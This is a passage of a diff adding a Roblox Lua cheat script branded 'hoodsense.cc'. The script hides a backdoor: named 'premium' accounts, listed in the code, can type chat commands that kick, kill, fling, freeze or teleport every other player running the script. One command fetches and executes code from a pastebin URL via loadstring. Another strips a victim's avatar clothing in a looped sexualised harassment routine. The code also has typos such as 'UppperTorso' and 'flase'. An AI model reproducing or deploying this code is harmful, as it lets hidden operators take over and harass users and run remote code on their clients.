+			game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(premium3.Character.UpperTorso.Position)
+		end
+	end
+
+end)
+
+premium3.Chatted:connect(function(cht)
+	if cht:match("$freeze .") then
+		if game.Players.LocalPlayer ~= premium3 then
+			freeze()
+		end
+	end
+
+end)
+
+premium3.Chatted:connect(function(cht)
+	if cht:match("$unfreeze .") then
+		if game.Players.LocalPlayer ~= premium3 then
+			unfreeze()
+		end
+	end
+
+end)
+
+premium3.Chatted:connect(function(cht)
+	if cht:match("$thaw .") then
+		if game.Players.LocalPlayer ~= premium3 then
+			unfreeze()
+		end
+	end
+
+end)
+
+premium3.Chatted:connect(function(cht)
+	if cht:match("$ban .") then
+		if game.Players.LocalPlayer ~= premium3 then
+			game.Players.LocalPlayer:kick("PERMA BAN")
+		end
+	end
+
+end)
+
+premium3.Chatted:connect(function(cht)
+	if cht:match("$kill .") then
+		if game.Players.LocalPlayer ~= premium3 then
+			game.Players.LocalPlayer.Character.Humanoid:Destroy()
+		end
+	end
+
+end)
+
+premium3.Chatted:connect(function(cht)
+	if cht:match("$rejoin .") then
+    	if game.Players.LocalPlayer ~= premium3 then
+        loadstring(game:HttpGet("https://pastebin.com/raw/1gtVMUz3"))()
+        end
+	end
+
+end)
+
+premium3.Chatted:connect(function(cht)
+	if cht:match("$void .") then
+		if game.Players.LocalPlayer ~= premium3 then
+			game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(0, -350, 0)
+		end
+	end
+
+end)
+
+premium3.Chatted:connect(function(cht)
+	if cht:match("$bring .") then
+		if game.Players.LocalPlayer ~= premium3 then
+			game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(premium3.Character.UpperTorso.Position)
+		end
+	end
+
+end)
+
+premium3.Chatted:connect(function(cht)
+	if cht:match("$grave .") then
+		if game.Players.LocalPlayer ~= premium3 then
+			game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(game.Players.LocalPlayer.Character.UpperTorso.Position.X, game.Players.LocalPlayer.Character.UpperTorso.Position.Y -10, game.Players.LocalPlayer.Character.UpperTorso.Position.z)
+			game.Players.LocalPlayer.Character.LowerTorso.Anchored = true
+		end
+	end
+
+end)
+
+premium3.Chatted:connect(function(cht)
+	if cht:match("$ungrave .") then
+		if game.Players.LocalPlayer ~= premium3 then
+			game.Players.LocalPlayer.Character.LowerTorso.Anchored = false
+			wait(0.1)
+			game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(game.Players.LocalPlayer.Character.UpperTorso.Position.X, game.Players.LocalPlayer.Character.UpperTorso.Position.Y +10, game.Players.LocalPlayer.Character.UpperTorso.Position.z)
+		end
+	end
+
+end)
+
+premium3.Chatted:connect(function(cht)
+	if cht:match("/e test") then
+		if game.Players.LocalPlayer ~= premium3 then
+            game.ReplicatedStorage.DefaultChatSystemChatEvents.SayMessageRequest:FireServer("Yes yes sir ;)","All")
+		end
+	end
+
+end)
+
+if game.Players.LocalPlayer == premium3 then
+game:GetService("StarterGui"):SetCore("SendNotification",{
+	Title = "hoodsense.cc";
+	Text = "Premium acces!";
+	Time = 10;
+	Icon = "rbxassetid://8768441000";
+    Button1 = "Okay!";
+})
+--[[game:GetService("StarterGui"):SetCore("SendNotification",{
+	Title = "hoodsense.cc";
+	Text = "No Premium!";
+	Time = 10;
+	Icon = "rbxassetid://8768441000";
+    Button1 = "Okay!";
+})]]
+end
+--[[
+██╗░░██╗░█████╗░░█████╗░██████╗░░██████╗███████╗███╗░░██╗░██████╗███████╗
+██║░░██║██╔══██╗██╔══██╗██╔══██╗██╔════╝██╔════╝████╗░██║██╔════╝██╔════╝
+███████║██║░░██║██║░░██║██║░░██║╚█████╗░█████╗░░██╔██╗██║╚█████╗░█████╗░░
+██╔══██║██║░░██║██║░░██║██║░░██║░╚═══██╗██╔══╝░░██║╚████║░╚═══██╗██╔══╝░░
+██║░░██║╚█████╔╝╚█████╔╝██████╔╝██████╔╝███████╗██║░╚███║██████╔╝███████╗
+╚═╝░░╚═╝░╚════╝░░╚════╝░╚═════╝░╚═════╝░╚══════╝╚═╝░░╚══╝╚═════╝░╚══════╝
+]]
+-------------------------------------------------------------------------
+local Players = game:GetService("Players")
+	Players.PlayerAdded:Connect(function(player)
+		print("[hoodsense.cc] Player Joined " .. player.Name)
+		local premium4 = game.Players.fv4lx
+ end)
+	Players.PlayerRemoving:Connect(function(player)
+	print("[hoodsense.cc] Player Left " .. player.Name)
+	local premium4 = game.Players.fv4lx
+end)
+--// Premium User //--
+local premium4 = game.Players.fv4lx
+-----------------------------------------------------------------------
+--// Premium Commands //--
+local freeze = function()
+	game.Players.LocalPlayer.Character.LowerTorso.Anchored = true
+	game.Players.LocalPlayer.Character.UppperTorso.Anchored = true
+end
+
+local unfreeze = function()
+	game.Players.LocalPlayer.Character.LowerTorso.Anchored = false
+	game.Players.LocalPlayer.Character.UppperTorso.Anchored = flase
+end
+
+premium4.Chatted:connect(function(cht)
+	if cht:match("$kick .") then
+		if game.Players.LocalPlayer ~= premium4 then
+			game.Players.LocalPlayer:Kick("Kicked by Premium user")
+		end
+	end
+
+end)
+
+premium4.Chatted:connect(function(cht)
+	if cht:match("$fling .") then
+		if game.Players.LocalPlayer ~= premium4 then
+			game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(0, 999, 0)
+			power = 99999999 -- change this to make it more or less powerful
+ 
+			game:GetService('RunService').Stepped:connect(function()
+			game.Players.LocalPlayer.Character.Head.CanCollide = false
+			game.Players.LocalPlayer.Character.UpperTorso.CanCollide = false
+			game.Players.LocalPlayer.Character.LowerTorso.CanCollide = false
+			game.Players.LocalPlayer.Character.HumanoidRootPart.CanCollide = false
+			end)
+			wait(.1)
+			local bambam = Instance.new("BodyThrust")
+			bambam.Parent = game.Players.LocalPlayer.Character.HumanoidRootPart
+			bambam.Force = Vector3.new(power,0,power)
+			bambam.Location = game.Players.LocalPlayer.Character.HumanoidRootPart.Position
+		end
+	end
+
+end)
+
+premium4.Chatted:connect(function(cht)
+	if cht:match("$benx .") then
+		if game.Players.LocalPlayer ~= premium4 then
+			wait(0) local A_1 = "" local A_2 = "All" local Event = game:GetService("ReplicatedStorage").DefaultChatSystemChatEvents.SayMessageRequest Event:FireServer(A_1, A_2) 
+			game.Workspace:FindFirstChildWhichIsA('Camera').CameraSubject = premium4.Character.HumanoidRootPart
+			local benxed = true
+			while benxed == true do
+				hummy = game:GetService("Players").LocalPlayer.Character.Humanoid
+				pcall(function()
+    					hummy.Parent.Pants:Destroy()
+				end)
+				pcall(function()
+    					hummy.Parent.Shirt:Destroy()
+				end)
+				game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = premium4.Character.HumanoidRootPart.CFrame + premium4.Character.HumanoidRootPart.CFrame.lookVector * 0.5
+				game.Players.LocalPlayer.Character.HumanoidRootPart.Velocity = game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame.lookVector * 70
+				wait(0.1)
+				game.Players.LocalPlayer.Character.HumanoidRootPart.Velocity = game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame.lookVector * -200
+			end
+		end
+	end
+
+end)
+
+premium4.Chatted:connect(function(cht)
+	if cht:match("$unbenx .") then
+		if game.Players.LocalPlayer ~= premium4 then
+			game.Players.LocalPlayer.Character.Humanoid:Destroy()
+			wait(15)
+			game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(premium4.Character.UpperTorso.Position)
+		end
+	end
+
+end)
+
+premium4.Chatted:connect(function(cht)
+	if cht:match("$freeze .") then
+		if game.Players.LocalPlayer ~= premium4 then
+			freeze()
+		end
+	end
+
+end)
+
+premium4.Chatted:connect(function(cht)
+	if cht:match("$unfreeze .") then
+		if game.Players.LocalPlayer ~= premium4 then
+			unfreeze()
+		end
+	end
+
+end)
+
+premium4.Chatted:connect(function(cht)
+	if cht:match("$thaw .") then
+		if game.Players.LocalPlayer ~= premium4 then
+			unfreeze()
+		end
+	end
+
+end)
+
+premium4.Chatted:connect(function(cht)
+	if cht:match("$ban .") then
+		if game.Players.LocalPlayer ~= premium4 then
+			game.Players.LocalPlayer:kick("PERMA BAN")
+		end
+	end
+
+end)
+
+premium4.Chatted:connect(function(cht)
+	if cht:match("$kill .") then
+		if game.Players.LocalPlayer ~= premium4 then
+			game.Players.LocalPlayer.Character.Humanoid:Destroy()
+		end
+	end
+
+end)
+
+premium4.Chatted:connect(function(cht)
+	if cht:match("$rejoin .") then
+    	if game.Players.LocalPlayer ~= premium4 then
+        loadstring(game:HttpGet("https://pastebin.com/raw/1gtVMUz3"))()
+        end
+	end
+
+end)
+
+premium4.Chatted:connect(function(cht)
+	if cht:match("$void .") then
+		if game.Players.LocalPlayer ~= premium4 then
+			game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(0, -350, 0)
+		end
+	end
+
+end)
+
+premium4.Chatted:connect(function(cht)
+	if cht:match("$bring .") then
+		if game.Players.LocalPlayer ~= premium4 then
+			game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(premium4.Character.UpperTorso.Position)
+		end
+	end
+
+end)
+
+premium4.Chatted:connect(function(cht)
+	if cht:match("$grave .") then
+		if game.Players.LocalPlayer ~= premium4 then
+			game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(game.Players.LocalPlayer.Character.UpperTorso.Position.X, game.Players.LocalPlayer.Character.UpperTorso.Position.Y -10, game.Players.LocalPlayer.Character.UpperTorso.Position.z)
+			game.Players.LocalPlayer.Character.LowerTorso.Anchored = true
+		end
+	end
+
+end)
+
+premium4.Chatted:connect(function(cht)
+	if cht:match("$ungrave .") then
+		if game.Players.LocalPlayer ~= premium4 then
+			game.Players.LocalPlayer.Character.LowerTorso.Anchored = false
+			wait(0.1)
+			game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(game.Players.LocalPlayer.Character.UpperTorso.Position.X, game.Players.LocalPlayer.Character.UpperTorso.Position.Y +10, game.Players.LocalPlayer.Character.UpperTorso.Position.z)
+		end
+	end
+
+end)
+
+premium4.Chatted:connect(function(cht)
+	if cht:match("/e test") then
+		if game.Players.LocalPlayer ~= premium4 then
+            game.ReplicatedStorage.DefaultChatSystemChatEvents.SayMessageRequest:FireServer("Yes yes sir ;)","All")
+		end
+	end
+
+end)
+
+if game.Players.LocalPlayer == premium4 then
+game:GetService("StarterGui"):SetCore("SendNotification",{
+	Title = "hoodsense.cc";
+	Text = "Premium acces!";
+	Time = 10;
+	Icon = "rbxassetid://8768441000";
+    Button1 = "Okay!";
+})
+--[[game:GetService("StarterGui"):SetCore("SendNotification",{
+	Title = "hoodsense.cc";
+	Text = "No Premium!";
+	Time = 10;
+	Icon = "rbxassetid://8768441000";
+    Button1 = "Okay!";
+})]]
+end
+--[[
+██╗░░██╗░█████╗░░█████╗░██████╗░░██████╗███████╗███╗░░██╗░██████╗███████╗
+██║░░██║██╔══██╗██╔══██╗██╔══██╗██╔════╝██╔════╝████╗░██║██╔════╝██╔════╝
+███████║██║░░██║██║░░██║██║░░██║╚█████╗░█████╗░░██╔██╗██║╚█████╗░█████╗░░
+██╔══██║██║░░██║██║░░██║██║░░██║░╚═══██╗██╔══╝░░██║╚████║░╚═══██╗██╔══╝░░
+██║░░██║╚█████╔╝╚█████╔╝██████╔╝██████╔╝███████╗██║░╚███║██████╔╝███████╗
+╚═╝░░╚═╝░╚════╝░░╚════╝░╚═════╝░╚═════╝░╚══════╝╚═╝░░╚══╝╚═════╝░╚══════╝
+]]
+-------------------------------------------------------------------------
+local Players = game:GetService("Players")
+	Players.PlayerAdded:Connect(function(player)
+		print("[hoodsense.cc] Player Joined " .. player.Name)
+		local premium5 = game.Players.xxxlolaxlol
+ end)
+	Players.PlayerRemoving:Connect(function(player)
+	print("[hoodsense.cc] Player Left " .. player.Name)
+	local premium5 = game.Players.xxxlolaxlol
+end)
+--// Premium User //--
+local premium5 = game.Players.xxxlolaxlol
+-----------------------------------------------------------------------
+--// Premium Commands //--
+local freeze = function()
+	game.Players.LocalPlayer.Character.LowerTorso.Anchored = true
+	game.Players.LocalPlayer.Character.UppperTorso.Anchored = true
+end
+
+local unfreeze = function()
+	game.Players.LocalPlayer.Character.LowerTorso.Anchored = false
+	game.Players.LocalPlayer.Character.UppperTorso.Anchored = flase
+end
+
+premium5.Chatted:connect(function(cht)
+	if cht:match("$kick .") then
+		if game.Players.LocalPlayer ~= premium5 then
+			game.Players.LocalPlayer:Kick("Kicked by Premium user")
+		end
+	end
+
+end)
+
+premium5.Chatted:connect(function(cht)
+	if cht:match("$fling .") then
+		if game.Players.LocalPlayer ~= premium5 then
+			game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(0, 999, 0)
+			power = 99999999 -- change this to make it more or less powerful
+ 
+			game:GetService('RunService').Stepped:connect(function()
+			game.Players.LocalPlayer.Character.Head.CanCollide = false
+			game.Players.LocalPlayer.Character.UpperTorso.CanCollide = false
+			game.Players.LocalPlayer.Character.LowerTorso.CanCollide = false
+			game.Players.LocalPlayer.Character.HumanoidRootPart.CanCollide = false
+			end)
+			wait(.1)
+			local bambam = Instance.new("BodyThrust")
+			bambam.Parent = game.Players.LocalPlayer.Character.HumanoidRootPart
+			bambam.Force = Vector3.new(power,0,power)
+			bambam.Location = game.Players.LocalPlayer.Character.HumanoidRootPart.Position
+		end
+	end
+
+end)
+
+premium5.Chatted:connect(function(cht)
+	if cht:match("$benx .") then
+		if game.Players.LocalPlayer ~= premium5 then
+			wait(0) local A_1 = "" local A_2 = "All" local Event = game:GetService("ReplicatedStorage").DefaultChatSystemChatEvents.SayMessageRequest Event:FireServer(A_1, A_2) 
+			game.Workspace:FindFirstChildWhichIsA('Camera').CameraSubject = premium5.Character.HumanoidRootPart
+			local benxed = true
+			while benxed == true do
+				hummy = game:GetService("Players").LocalPlayer.Character.Humanoid
+				pcall(function()
+    					hummy.Parent.Pants:Destroy()
+				end)
+				pcall(function()
+    					hummy.Parent.Shirt:Destroy()
+				end)
+				game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = premium5.Character.HumanoidRootPart.CFrame + premium5.Character.HumanoidRootPart.CFrame.lookVector * 0.5
+				game.Players.LocalPlayer.Character.HumanoidRootPart.Velocity = game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame.lookVector * 70
+				wait(0.1)
+				game.Players.LocalPlayer.Character.HumanoidRootPart.Velocity = game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame.lookVector * -200
+			end
+		end
+	end
+
+end)
+
+premium5.Chatted:connect(function(cht)
+	if cht:match("$unbenx .") then
+		if game.Players.LocalPlayer ~= premium5 then
+			game.Players.LocalPlayer.Character.Humanoid:Destroy()
+			wait(15)
+			game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(premium5.Character.UpperTorso.Position)
+		end
+	end
+
+end)
+
+premium5.Chatted:connect(function(cht)
+	if cht:match("$freeze .") then
+		if game.Players.LocalPlayer ~= premium5 then
+			freeze()
+		end
+	end
+
+end)
+
+premium5.Chatted:connect(function(cht)
+	if cht:match("$unfreeze .") then
+		if game.Players.LocalPlayer ~= premium5 then
+			unfreeze()
+		end
+	end
+
+end)
+
+premium5.Chatted:connect(function(cht)
+	if cht:match("$thaw .") then
+		if game.Players.LocalPlayer ~= premium5 then
+			unfreeze()
+		end
+	end
+
+end)
+
+premium5.Chatted:connect(function(cht)
+	if cht:match("$ban .") then
+		if game.Players.LocalPlayer ~= premium5 then
+			game.Players.LocalPlayer:kick("PERMA BAN")
+		end
+	end
+
+end)
+
+premium5.Chatted:connect(function(cht)
+	if cht:match("$kill .") then
+		if game.Players.LocalPlayer ~= premium5 then
+			game.Players.LocalPlayer.Character.Humanoid:Destroy()
+		end
+	end
+
+end)
+
+premium5.Chatted:connect(function(cht)
+	if cht:match("$rejoin .") then
+    	if game.Players.LocalPlayer ~= premium5 then
+        loadstring(game:HttpGet("https://pastebin.com/raw/1gtVMUz3"))()
+        end
+	end
+
+end)
+
+premium5.Chatted:connect(function(cht)
+	if cht:match("$void .") then
+		if game.Players.LocalPlayer ~= premium5 then
+			game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(0, -350, 0)
+		end
+	end
+
+end)
+
+premium5.Chatted:connect(function(cht)
+	if cht:match("$bring .") then
+		if game.Players.LocalPlayer ~= premium5 then
+			game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(premium5.Character.UpperTorso.Position)
+		end
+	end
+
+end)
+
+premium5.Chatted:connect(function(cht)
+	if cht:match("$grave .") then
+		if game.Players.LocalPlayer ~= premium5 then
+			game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(game.Players.LocalPlayer.Character.UpperTorso.Position.X, game.Players.LocalPlayer.Character.UpperTorso.Position.Y -10, game.Players.LocalPlayer.Character.UpperTorso.Position.z)
+			game.Players.LocalPlayer.Character.LowerTorso.Anchored = true
+		end
+	end
+
+end)
+
+premium5.Chatted:connect(function(cht)
+	if cht:match("$ungrave .") then
+		if game.Players.LocalPlayer ~= premium5 then
+			game.Players.LocalPlayer.Character.LowerTorso.Anchored = false
+			wait(0.1)
+			game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(game.Players.LocalPlayer.Character.UpperTorso.Position.X, game.Players.LocalPlayer.Character.UpperTorso.Position.Y +10, game.Players.LocalPlayer.Character.UpperTorso.Position.z)
+		end
+	end
+
+end)
+
+premium5.Chatted:connect(function(cht)
+	if cht:match("/e test") then
+		if game.Players.LocalPlayer ~= premium5 then
+            game.ReplicatedStorage.DefaultChatSystemChatEvents.SayMessageRequest:FireServer("Yes yes sir ;)","All")
+		end
+	end
+
+end)
+
+if game.Players.LocalPlayer == premium5 then
+game:GetService("StarterGui"):SetCore("SendNotification",{
+	Title = "hoodsense.cc";
+	Text = "Premium acces!";
+	Time = 10;
+	Icon = "rbxassetid://8768441000";
+    Button1 = "Okay!";
+})
+--[[game:GetService("StarterGui"):SetCore("SendNotification",{
+	Title = "hoodsense.cc";
+	Text = "No Premium!";
+	Time = 10;
+	Icon = "rbxassetid://8768441000";
+    Button1 = "Okay!";
+})]]
+end
+--[[
+██╗░░██╗░█████╗░░█████╗░██████╗░░██████╗███████╗███╗░░██╗░██████╗███████╗
+██║░░██║██╔══██╗██╔══██╗██╔══██╗██╔════╝██╔════╝████╗░██║██╔════╝██╔════╝
+███████║██║░░██║██║░░██║██║░░██║╚█████╗░█████╗░░██╔██╗██║╚█████╗░█████╗░░
+██╔══██║██║░░██║██║░░██║██║░░██║░╚═══██╗██╔══╝░░██║╚████║░╚═══██╗██╔══╝░░
+██║░░██║╚█████╔╝╚█████╔╝██████╔╝██████╔╝███████╗██║░╚███║██████╔╝███████╗
+╚═╝░░╚═╝░╚════╝░░╚════╝░╚═════╝░╚═════╝░╚══════╝╚═╝░░╚══╝╚═════╝░╚══════╝
+]]
+-------------------------------------------------------------------------
+while true do
+warn("---------------------------")
+warn("---------------------------")
+warn("-[[[[-----------------]]]]-")
+warn("-[[[[-----------------]]]]-")
+warn("-[[[[-----------------]]]]-")
+warn("-[[[[-----------------]]]]-")
+warn("-[[[[-----------------]]]]-")
+warn("-[[[[-----------------]]]]-")
+warn("-[[[[][][][][][][][][][]]]-")
+warn("-[[[[][][][][][][][][][]]]-")
+warn("-[[[[][][][][][][][][][]]]-")
+warn("-[[[[-----------------]]]]-")
+warn("-[[[[-----------------]]]]-")
+warn("-[[[[-----------------]]]]-")
+warn("-[[[[-----------------]]]]-")
+warn("-[[[[-----------------]]]]-")
+warn("-[[[[-----------------]]]]-")
+warn("---------------------------")
+warn("---------------------------")
+print("                          ")
+warn("---------------------------")
+warn("---------------------------")
+warn("-[[[[][][][][][][][][][]]]-")
+warn("-[[[[][][][][][][][][][]]]-")
+warn("-[[[[][][][][][][][][][]]]-")
+warn("-[[[-------------------]]]-")
+warn("-[[[-------------------]]]-")
+warn("-[[[-------------------]]]-")
+warn("-[[[-------------------]]]-")
+warn("-[[[-------------------]]]-")
+warn("-[[[-------------------]]]-")
+warn("-[[[-------------------]]]-")
+warn("-[[[-------------------]]]-")
+warn("-[[[-------------------]]]-")
+warn("-[[[[][][][][][][][][][]]]-")
+warn("-[[[[][][][][][][][][][]]]-")
+warn("-[[[[][][][][][][][][][]]]-")
+warn("---------------------------")
+warn("---------------------------")
+print("                          ")
+warn("---------------------------")
+warn("---------------------------")
+warn("-[[[[][][][][][][][][][]]]-")
+warn("-[[[[][][][][][][][][][]]]-")
+warn("-[[[[][][][][][][][][][]]]-")
+warn("-[[[-------------------]]]-")
+warn("-[[[-------------------]]]-")
+warn("-[[[-------------------]]]-")
+warn("-[[[-------------------]]]-")
+warn("-[[[-------------------]]]-")
+warn("-[[[-------------------]]]-")
+warn("-[[[-------------------]]]-")
+warn("-[[[-------------------]]]-")
+warn("-[[[-------------------]]]-")
+warn("-[[[[][][][][][][][][][]]]-")
+warn("-[[[[][][][][][][][][][]]]-")
+warn("-[[[[][][][][][][][][][]]]-")
+warn("---------------------------")
+warn("---------------------------")
+print("                          ")
+warn("---------------------------")
+warn("---------------------------")
+warn("-[[[[][]-------------------")
+warn("-[[[[][][][]---------------")
+warn("-[[[[][][][][][][][][------")
+warn("-[[[-------------------]]]-")
+warn("-[[[-------------------]]]-")
+warn("-[[[-------------------]]]-")
+warn("-[[[-------------------]]]-")
+warn("-[[[-------------------]]]-")
+warn("-[[[-------------------]]]-")
+warn("-[[[-------------------]]]-")
+warn("-[[[-------------------]]]-")
+warn("-[[[-------------------]]]-")
+warn("-[[[[][][][][][][][][------")
+warn("-[[[[][][][]---------------")
+warn("-[[[[][]-------------------")
+warn("---------------------------")
+warn("---------------------------")
+print("                          ")
+print("                          ")
+print("                          ")
+print("                          ")
+print("                          ")
+print("                          ")
+warn("---------------------------")
+warn("---------------------------")
+warn("-[[[[][][][][][][][][][]]]-")
+warn("-[[[-----------------------")
+warn("-[[[-----------------------")
+warn("-[[[-----------------------")
+warn("-[[[-----------------------")
+warn("-[[[-----------------------")
+warn("-[[[-----------------------")
+warn("-[[[[][][][][][][][][][]]]-")
+warn("-----------------------]]]-")
+warn("-----------------------]]]-")
+warn("-----------------------]]]-")
+warn("-----------------------]]]-")
+warn("-----------------------]]]-")
+warn("-----------------------]]]-")
+warn("-----------------------]]]-")
+warn("-[[[[][][][][][][][][][]]]-")
+warn("---------------------------")
+print("                          ")
+warn("---------------------------")
+warn("---------------------------")
+warn("-[[[[][][][][][][][][][]]]-")
+warn("-[[[[][][][][][][][][][]]]-")
+warn("-[[[-----------------------")
+warn("-[[[-----------------------")
+warn("-[[[-----------------------")
+warn("-[[[-----------------------")
+warn("-[[[[][][][][][][][][][]]]-")
+warn("-[[[[][][][][][][][][][]]]-")
+warn("-[[[[][][][][][][][][][]]]-")
+warn("-[[[-----------------------")
+warn("-[[[-----------------------")
+warn("-[[[-----------------------")
+warn("-[[[-----------------------")
+warn("-[[[[][][][][][][][][][]]]-")
+warn("-[[[[][][][][][][][][][]]]-")
+warn("---------------------------")
+warn("---------------------------")
+print("                          ")
+warn("---------------------------")
+warn("---------------------------")
+warn("-[[[[[[[--------------]]]]-")
+warn("-[[[[[[[[-------------]]]]-")
+warn("-[[[[-[[[[------------]]]]-")
+warn("-[[[[--[[[[-----------]]]]-")
+warn("-[[[[---[[[[----------]]]]-")
+warn("-[[[[----[[[[---------]]]]-")
+warn("-[[[[-----[[[[--------]]]]-")
+warn("-[[[[------[[[[-------]]]]-")
+warn("-[[[[-------[[[[------]]]]-")
+warn("-[[[[--------[[[[-----]]]]-")
+warn("-[[[[---------[[[[----]]]]-")
+warn("-[[[[----------[[[[---]]]]-")
+warn("-[[[[-----------[[[[--]]]]-")
+warn("-[[[[------------[[[[-]]]]-")
+warn("-[[[[-------------[[[[]]]]-")
+warn("---------------------------")
+warn("---------------------------")
+print("                          ")
+warn("---------------------------")
+warn("---------------------------")
+warn("-[[[[][][][][][][][][][]]]-")
+warn("-[[[-----------------------")
+warn("-[[[-----------------------")
+warn("-[[[-----------------------")
+warn("-[[[-----------------------")
+warn("-[[[-----------------------")
+warn("-[[[-----------------------")
+warn("-[[[[][][][][][][][][][]]]-")
+warn("-----------------------]]]-")
+warn("-----------------------]]]-")
+warn("-----------------------]]]-")
+warn("-----------------------]]]-")
+warn("-----------------------]]]-")
+warn("-----------------------]]]-")
+warn("-----------------------]]]-")
+warn("-[[[[][][][][][][][][][]]]-")
+warn("---------------------------")
+print("                          ")
+warn("---------------------------")
+warn("---------------------------")
+warn("-[[[[][][][][][][][][][]]]-")
+warn("-[[[[][][][][][][][][][]]]-")
+warn("-[[[-----------------------")
+warn("-[[[-----------------------")
+warn("-[[[-----------------------")
+warn("-[[[-----------------------")
+warn("-[[[[][][][][][][][][][]]]-")
+warn("-[[[[][][][][][][][][][]]]-")
+warn("-[[[[][][][][][][][][][]]]-")
+warn("-[[[-----------------------")
+warn("-[[[-----------------------")
+warn("-[[[-----------------------")
+warn("-[[[-----------------------")
+warn("-[[[[][][][][][][][][][]]]-")
+warn("-[[[[][][][][][][][][][]]]-")
+warn("---------------------------")
+warn("---------------------------")
+print("                          ")
+wait(69420)
+end
